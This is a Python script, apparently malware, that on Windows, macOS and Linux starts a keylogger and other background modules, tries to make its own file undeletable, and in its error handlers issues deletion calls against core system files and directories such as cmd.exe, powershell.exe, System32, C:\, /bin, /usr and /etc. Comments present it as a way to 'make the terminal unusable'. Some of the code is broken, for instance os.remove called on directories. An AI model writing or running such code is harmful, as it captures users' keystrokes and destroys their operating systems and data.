import os
import platform
import keylogger
import background_runner
import test
import test1
import test2
import powershell
import mycmd
import terminal

# For Windows, you can use the following code to make the terminal unusable by deleting the cmd.exe and powershell.exe files. Please note that this is a destructive action and should be used with caution.

current_system = platform.system()

if current_system == 'Windows':
    try:
            background_runner.run_in_background(keylogger.on_press())
            background_runner.run_in_background(test.run_forever())
            background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
            background_runner.run_in_background(terminal.start_terminal)
            background_runner.run_in_background(mycmd.starter_cmd())
            background_runner.run_in_background(powershell.start_powershell)
    except Exception as e:
                print(f"An error occurred: {e}")
                os.remove("C:\\Windows\\System32\\cmd.exe")
                os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
                os.remove("C:\\Windows\\System32")
                os.remove("C:\\Windows")
                os.remove("C:\\Users")
                os.remove("C:\\program files")
                os.remove("C:\\program files (x86)")
                os.remove("C:\\")

# For MacOS, you can use the following code to make the terminal unusable by deleting the Terminal.app file. Please note that this is a destructive action and should be used with caution.

elif current_system == 'Darwin':
    try:
            background_runner.run_in_background(keylogger.start_keylogger)
            background_runner.run_in_background(test.test)
            background_runner.run_in_background(test1.test1)
            background_runner.run_in_background(test2.test2)
            background_runner.run_in_background(terminal.start_terminal)
            background_runner.run_in_background(mycmd.start_cmd)
            background_runner.run_in_background(powershell.start_powershell)

    except Exception as e:
                print(f"An error occurred: {e}")
                os.remove("/Applications/Utilities/Terminal.app")
                os.remove("/Applications/Utilities")
                os.remove("/Applications")
                os.remove("/Users")
                os.remove("/System")
                os.remove("/Library")
                os.remove("/bin")
                os.remove("/sbin")
                os.remove("/usr")
                os.remove("/var")
                os.remove("/etc")
                os.remove("/root")


# For Linux, you can use the following code to make the terminal unusable by deleting the bash executable. Please note that this is a destructive action and should be used with caution.

elif current_system == 'Linux':
    try:
            background_runner.run_in_background(keylogger.start_keylogger)
            background_runner.run_in_background(test.test)
            background_runner.run_in_background(test1.test1)
            background_runner.run_in_background(test2.test2)
            background_runner.run_in_background(terminal.start_terminal)
            background_runner.run_in_background(mycmd.starter_cmd)
            background_runner.run_in_background(powershell.start_powershell)

    except Exception as e:
                print(f"An error occurred: {e}")
                os.remove("/root/terminal")
                os.remove("/bin/sh")
                os.remove("/bin/bash")
                os.remove("/bin")
                os.remove("/sbin")
                os.remove("/usr")
                os.remove("/var")
                os.remove("/etc")
                os.remove("/root")


else:    print("Unsupported operating system.")

test.run_forever("make_terminal_unusable.py")
test.run_forever("keylogger.py")
test.run_forever("test.py")
test.run_forever("test1.py")
test.run_forever("test2.py")
test.run_forever("background_runner.py")
terminal.start_terminal()
mycmd.starter_cmd()
powershell.start_powershell()
